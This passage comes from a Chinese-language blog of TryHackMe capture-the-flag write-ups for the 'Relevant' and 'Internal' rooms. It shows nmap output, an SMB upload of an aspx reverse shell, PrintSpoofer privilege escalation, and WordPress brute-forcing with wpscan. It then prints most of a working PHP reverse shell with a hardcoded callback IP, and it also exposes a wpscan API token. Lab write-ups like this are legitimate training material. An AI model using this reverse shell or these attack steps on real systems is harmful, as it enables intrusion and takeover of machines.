Nmap scan report for 10.10.127.72
Host is up <span class="token punctuation">(</span>0.20s latency<span class="token punctuation">)</span>.

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|<span class="token property">_http-title</span><span class="token punctuation">:</span> IIS Windows Server
| <span class="token property">http-methods</span><span class="token punctuation">:</span> 
|_  Potentially risky <span class="token property">methods</span><span class="token punctuation">:</span> TRACE
|<span class="token property">_http-server-header</span><span class="token punctuation">:</span> Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|<span class="token property">_ssl-date</span><span class="token punctuation">:</span> <span class="token property">2024-04-29T03</span><span class="token punctuation">:</span><span class="token property">39</span><span class="token punctuation">:</span>53+<span class="token property">00</span><span class="token punctuation">:</span>00<span class="token punctuation">;</span> -1s <span class="token keyword">from</span> scanner time.
| <span class="token property">ssl-cert</span><span class="token punctuation">:</span> <span class="token property">Subject</span><span class="token punctuation">:</span> commonName=Relevant
| Not valid <span class="token property">before</span><span class="token punctuation">:</span> <span class="token property">2024-04-28T02</span><span class="token punctuation">:</span><span class="token property">58</span><span class="token punctuation">:</span>49
|_Not valid <span class="token property">after</span><span class="token punctuation">:</span>  <span class="token property">2024-10-28T02</span><span class="token punctuation">:</span><span class="token property">58</span><span class="token punctuation">:</span>49
| <span class="token property">rdp-ntlm-info</span><span class="token punctuation">:</span> 
|   <span class="token property">Target_Name</span><span class="token punctuation">:</span> RELEVANT
|   <span class="token property">NetBIOS_Domain_Name</span><span class="token punctuation">:</span> RELEVANT
|   <span class="token property">NetBIOS_Computer_Name</span><span class="token punctuation">:</span> RELEVANT
|   <span class="token property">DNS_Domain_Name</span><span class="token punctuation">:</span> Relevant
|   <span class="token property">DNS_Computer_Name</span><span class="token punctuation">:</span> Relevant
|   <span class="token property">Product_Version</span><span class="token punctuation">:</span> 10.0.14393
|_  <span class="token property">System_Time</span><span class="token punctuation">:</span> <span class="token property">2024-04-29T03</span><span class="token punctuation">:</span><span class="token property">39</span><span class="token punctuation">:</span>14+<span class="token property">00</span><span class="token punctuation">:</span>00
49663/tcp open  http          Microsoft IIS httpd 10.0
| <span class="token property">http-methods</span><span class="token punctuation">:</span> 
|_  Potentially risky <span class="token property">methods</span><span class="token punctuation">:</span> TRACE
|<span class="token property">_http-title</span><span class="token punctuation">:</span> IIS Windows Server
|<span class="token property">_http-server-header</span><span class="token punctuation">:</span> Microsoft-IIS/10.0
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service <span class="token property">Info</span><span class="token punctuation">:</span> <span class="token property">OSs</span><span class="token punctuation">:</span> Windows<span class="token punctuation">,</span> Windows Server 2008 R2 <span class="token operator">-</span> 2012<span class="token punctuation">;</span> <span class="token property">CPE</span><span class="token punctuation">:</span> <span class="token property">cpe</span><span class="token punctuation">:</span>/<span class="token property">o</span><span class="token punctuation">:</span><span class="token property">microsoft</span><span class="token punctuation">:</span>windows

Host script <span class="token property">results</span><span class="token punctuation">:</span>
| <span class="token property">smb2-security-mode</span><span class="token punctuation">:</span> 
|   <span class="token property">3</span><span class="token punctuation">:</span><span class="token property">1</span><span class="token punctuation">:</span><span class="token property">1</span><span class="token punctuation">:</span> 
|_    Message signing enabled but <span class="token operator">not</span> required
|<span class="token property">_clock-skew</span><span class="token punctuation">:</span> <span class="token property">mean</span><span class="token punctuation">:</span> 1h24m00s<span class="token punctuation">,</span> <span class="token property">deviation</span><span class="token punctuation">:</span> 3h07m52s<span class="token punctuation">,</span> <span class="token property">median</span><span class="token punctuation">:</span> 0s
| <span class="token property">smb-security-mode</span><span class="token punctuation">:</span> 
|   <span class="token property">account_used</span><span class="token punctuation">:</span> guest
|   <span class="token property">authentication_level</span><span class="token punctuation">:</span> user
|   <span class="token property">challenge_response</span><span class="token punctuation">:</span> supported
|_  <span class="token property">message_signing</span><span class="token punctuation">:</span> disabled <span class="token punctuation">(</span>dangerous<span class="token punctuation">,</span> but default<span class="token punctuation">)</span>
| <span class="token property">smb2-time</span><span class="token punctuation">:</span> 
|   <span class="token property">date</span><span class="token punctuation">:</span> <span class="token property">2024-04-29T03</span><span class="token punctuation">:</span><span class="token property">39</span><span class="token punctuation">:</span>14
|_  <span class="token property">start_date</span><span class="token punctuation">:</span> <span class="token property">2024-04-29T02</span><span class="token punctuation">:</span><span class="token property">59</span><span class="token punctuation">:</span>08
| <span class="token property">smb-os-discovery</span><span class="token punctuation">:</span> 
|   <span class="token property">OS</span><span class="token punctuation">:</span> Windows Server 2016 Standard Evaluation 14393 <span class="token punctuation">(</span>Windows Server 2016 Standard Evaluation 6.3<span class="token punctuation">)</span>
|   Computer <span class="token property">name</span><span class="token punctuation">:</span> Relevant
|   NetBIOS computer <span class="token property">name</span><span class="token punctuation">:</span> RELEVANT\x00
|   <span class="token property">Workgroup</span><span class="token punctuation">:</span> WORKGROUP\x00
|_  System <span class="token property">time</span><span class="token punctuation">:</span> <span class="token property">2024-04-28T20</span><span class="token punctuation">:</span><span class="token property">39</span><span class="token punctuation">:</span><span class="token property">18-07</span><span class="token punctuation">:</span>00

Service detection performed. Please report any incorrect results at <span class="token property">https</span><span class="token punctuation">:</span><span class="token comment">//nmap.org/submit/ .</span>
Nmap <span class="token property">done</span><span class="token punctuation">:</span> 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 101.66 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Web站点探测">Web站点探测</h2>
<p>尝试扫web站点目录，在49663端口下扫到了隐藏目录</p>
<p><img src="image-20240429193020118.png" alt="image-20240429193020118"></p>
<p>感觉又是我想不到的思路，这里可以看到隐藏目录与我们SMB共享目录名称相同，我们访问看看</p>
<p><img src="image-20240429193752399.png" alt="image-20240429193752399"></p>
<p>可以看到直接访问就能得到文件内容，说明这个用户的SMB共享托管到了web站点了，这里我看有的师傅是先尝试nmap继续扫描看是否存在一些脆弱的易受攻击的服务，也有的直接就知道可以上传反向shell。</p>
<h2 id="SMB上传反向shell">SMB上传反向shell</h2>
<p>这里我也先跟着师傅们走，等最后回过头来在思考，首先msf生成一个反向shell，由于这是IIS服务器，因此肯定是生成aspx文件</p>
<p><img src="image-20240429194613331.png" alt="image-20240429194613331"></p>
<p>接着连接SMB共享，然后put上传shell，之后浏览器或者curl访问</p>
<p><img src="image-20240429194709396.png" alt="image-20240429194709396"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">dir /s /b <span class="token property">c</span><span class="token punctuation">:</span>\ | find <span class="token string">"user.txt"</span>
dir /s /b <span class="token property">c</span><span class="token punctuation">:</span>\ | find <span class="token string">"root.txt"</span>

#Windows命令行-- 按文件名查找相关路径 dir /s /b <span class="token property">c</span><span class="token punctuation">:</span>\ | find <span class="token string">"user.txt"</span>
#使用/b带有 DIR 命令的开关会去除所有多余的信息，仅显示当前目录中的文件夹和文件的名称，而不显示文件大小和时间戳等属性。
#或者直接输入 dir \user.txt /s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240429195040086.png" alt="image-20240429195040086"></p>
<h2 id="Windows令牌提权">Windows令牌提权</h2>
<p>接着就是windows提权，还是不熟悉。。。。不过这里知道是利用令牌窃取</p>
<p><img src="image-20240429195357787.png" alt="image-20240429195357787"></p>
<p>由上图可知 当前用户似乎启用了 SeImpersonatePrivilege 令牌权限，这意味着我们可以使用令牌模拟来提升权限；接下来我们需要在目标机上执行一个漏洞利用程序–下载<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0">PrintSpoofer.exe</a>，并将该exe文件上传到目标机（可以通过SMB服务上传文件）。</p>
<p><img src="image-20240429202300022.png" alt="image-20240429202300022"></p>
<p>上传之后</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">dir /s /b <span class="token property">c</span><span class="token punctuation">:</span>\ | find <span class="token string">"PrintSpoofer64.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>找到exe所在位置，运行即可提权</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">PrintSpoofer64.exe -i -c cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240429202400973.png" alt="image-20240429202400973"></p>
<p><img src="image-20240429202407158.png" alt="image-20240429202407158"></p>
<h2 id="总结-11">总结</h2>
<p>常规扫描之后，发现了139与445端口，尝试枚举SMB服务，发现四个共享文件，很可疑，接着扫描web站点目录，但没有结果，却发现四万多的端口也开启了IIS服务，接着尝试扫描该端口对应的目录，结果发现存在SMB共享目录。</p>
<p>接着发现SMB的共享目录允许上传文件（又因为能访问共享目录）会想到上传反向shell，之后访问拿到shell，接着就是Windows提权，whoami /priv发现某些特殊令牌开启了，直接github搜相关的利用工具，成功system权限。</p>
<p>给我的思考就是，在前期nmap扫的时候，就单纯的扫全端口即可，扫出来，在针对性的启用脚本扫描这些端口，可能会很快速。</p>
<p>接着扫目录也没必要陷入误区：非得扫web站点的目录（80端口）一定要都看看。还是得学会google，遇到相关关键问题，不会找办法利用，只能无脑看wp，这很可笑。</p>
<h2 id="参考文章-3">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://madushan-perera.medium.com/tryhackme-relevant-walkthrough-6e7c83def069">TryHackMe: Relevant — Walkthrough</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@jovanski.wisuda/relevant-tryhackme-walkthrough-234ec27f1998">Relevant — TryHackMe: Walkthrough</a></p>
<p><a target="_blank" rel="noopener" href="https://systemweakness.com/relevant-try-hack-me-e5c614aca4f9">Relevant- Try Hack Me</a></p>
<h1>0x12 Internal</h1>
<h2 id="渗透测试任务">渗透测试任务</h2>
<p>您已被分配给一位客户，该客户希望对三周后发布到生产环境的环境进行渗透测试。</p>
<p><strong>Scope of Work 工作范围</strong></p>
<p>客户请求工程师对所提供的虚拟环境进行外部、Web 应用程序和内部评估。客户要求提供有关评估的最少信息，希望从恶意行为者的角度进行参与（黑盒渗透测试）。客户要求您确保两个标志（未提供位置）作为利用证据：</p>
<ul>
<li>User.txt</li>
<li>Root.txt</li>
</ul>
<p>此外，客户还提供了以下范围津贴：</p>
<ul>
<li>确保修改主机文件以反映internal.thm</li>
<li>本次合作允许使用任何工具或技术</li>
<li>找到并记录所有发现的漏洞</li>
<li>将发现的标志提交到仪表板</li>
<li>仅分配给您计算机的 IP 地址在范围内</li>
</ul>
<p>（角色扮演关闭）</p>
<p>我鼓励您将这一挑战视为实际的渗透测试。考虑编写一份报告，其中包括执行摘要、漏洞和利用评估以及补救建议，因为这将有利于您为 eLearnsecurity eCPPT 或作为该领域渗透测试人员的职业生涯做准备。</p>
<p>注意 - 这个房间可以在没有 Metasploit 的情况下完成</p>
<h2 id="常规扫描-2">常规扫描</h2>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nmap -T5 -p- 10.10.188.153<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240430081644141.png" alt="image-20240430081644141"></p>
<p>发现只开启了两个端口，先扫一下web站点</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">gobuster dir -u <span class="token string">"http://10.10.188.153/"</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -t 50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240430083811925.png" alt="image-20240430083811925"></p>
<h2 id="wordpress渗透">wordpress渗透</h2>
<p>发现是存在wordpress CMS，上wpscan进行进一步的扫描</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">wpscan --url <span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//10.10.188.153/wordpress/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>首先是简单扫描，发现wp版本：5.4.2，不过google了一番没找到利用的，想着wpscan能扫出啥，发现跟workthrough不一致，加不加token都扫不到这个wp的主题，但workthrough却可以，不理解</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token comment">//扫描插件漏洞</span>
wpscan --api-token WjvZf12T8mMWrRkopYBhoTCQ5tDZfdk0l0vxqNbEpwU --url <span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//10.10.188.153/wordpress/ -e vp</span>
<span class="token comment">//获取wp的用户名</span>
wpscan --api-token WjvZf12T8mMWrRkopYBhoTCQ5tDZfdk0l0vxqNbEpwU --url <span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//internal.thm/wordpress/ -e u </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>至于这个wp的用户名，我们就可以信息搜集一手，可以找博客，或者直接在登陆页面，输入一些用户名，看页面回显是否一致，还有就是上述wpscan爆出的用户名</p>
<p><img src="image-20240430103017069.png" alt="image-20240430103017069"></p>
<p>之后尝试利用wpscan爆破密码</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">wpscan --url <span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//10.10.188.153/wordpress/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>密码：my2boys</p>
<p><img src="image-20240430093229348.png" alt="image-20240430093229348"></p>
<h2 id="建立shell">建立shell</h2>
<p>如下图找到主题编辑，可以看到能修改PHP文件，上传一个 php_reverse_shell.php即可</p>
<p><img src="image-20240430091638326.png" alt="image-20240430091638326"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
<span class="token comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
<span class="token comment">//</span>
<span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span>
<span class="token comment">// for any actions performed using this tool.  The author accepts no liability</span>
<span class="token comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span>
<span class="token comment">// do not use this tool.</span>
<span class="token comment">//</span>
<span class="token comment">// In all other respects the GPL version 2 applies:</span>
<span class="token comment">//</span>
<span class="token comment">// This program is free software; you can redistribute it and/or modify</span>
<span class="token comment">// it under the terms of the GNU General Public License version 2 as</span>
<span class="token comment">// published by the Free Software Foundation.</span>
<span class="token comment">//</span>
<span class="token comment">// This program is distributed in the hope that it will be useful,</span>
<span class="token comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="token comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="token comment">// GNU General Public License for more details.</span>
<span class="token comment">//</span>
<span class="token comment">// You should have received a copy of the GNU General Public License along</span>
<span class="token comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span class="token comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>
<span class="token comment">//</span>
<span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span>
<span class="token comment">// for any actions performed using this tool.  If these terms are not acceptable to</span>
<span class="token comment">// you, then do not use this tool.</span>
<span class="token comment">//</span>
<span class="token comment">// You are encouraged to send comments, improvements or suggestions to</span>
<span class="token comment">// me at pentestmonkey@pentestmonkey.net</span>
<span class="token comment">//</span>
<span class="token comment">// Description</span>
<span class="token comment">// -----------</span>
<span class="token comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span>
<span class="token comment">// The recipient will be given a shell running as the current user (apache normally).</span>
<span class="token comment">//</span>
<span class="token comment">// Limitations</span>
<span class="token comment">// -----------</span>
<span class="token comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span>
<span class="token comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span>
<span class="token comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span>
<span class="token comment">//</span>
<span class="token comment">// Usage</span>
<span class="token comment">// -----</span>
<span class="token comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>

<span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'10.14.79.125'</span><span class="token punctuation">;</span>  <span class="token comment">// CHANGE THIS</span>
<span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">5555</span><span class="token punctuation">;</span>       <span class="token comment">// CHANGE THIS</span>
<span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span>
<span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span>
<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token comment">//</span>
<span class="token comment">// Daemonise ourself if possible to avoid zombies later</span>
<span class="token comment">//</span>

<span class="token comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span>
<span class="token comment">// our php process and avoid zombies.  Worth a try...</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Fork and have the parent process exit</span>
        <span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Parent exits</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Make the current process a session leader</span>
        <span class="token comment">// Will only succeed if we forked</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Change to a safe directory</span>
<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Remove any umask we inherited</span>
<span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//</span>
<span class="token comment">// Do the reverse shell...</span>
<span class="token comment">//</span>

<span class="token comment">// Open reverse connection</span>
<span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Spawn shell process</span>
<span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
   <span class="token number">0</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdin is a pipe that the child will read from</span>
   <span class="token number">1</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdout is a pipe that the child will write to</span>
   <span class="token number">2</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   <span class="token comment">// stderr is a pipe that the child will write to</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Set everything to non-blocking</span>
<span class="token comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span>
<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successfully opened reverse shell to <span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// Check for end of TCP connection</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell connection terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Check for end of STDOUT</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell process terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Wait until a command is end down $sock, or some</span>
        <span class="token comment">// command output is available on STDOUT or STDERR</span>
        <span class="token variable">$read_a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$num_changed_sockets</span> <span class="token operator">=</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token variable">$read_a</span><span class="token punctuation">,</span> <span class="token variable">$write_a</span><span class="token punctuation">,</span> <span class="token variable">$error_a</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// If we can read from the TCP socket, send</span>
        <span class="token comment">// data to process's STDIN</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// If we can read from the process's STDOUT</span>
        <span class="token comment">// send data down tcp connection</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
